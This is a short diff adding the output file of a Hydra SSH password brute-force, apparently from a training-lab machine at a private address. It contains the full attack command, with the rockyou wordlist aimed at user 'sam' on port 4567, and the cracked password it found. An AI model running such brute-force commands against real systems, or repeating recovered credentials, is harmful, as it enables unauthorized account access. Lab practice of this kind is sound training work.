@@ -1,0 +1,2 @@
+# Hydra v9.1 run at 2020-12-06 18:26:17 on 10.10.58.139 ssh (hydra -l sam -P /usr/share/wordlists/rockyou.txt -o hydra_found.txt -s 4567-f -vV 10.10.58.139 ssh)
+[4567][ssh] host: 10.10.58.139   login: sam   password: chocolate
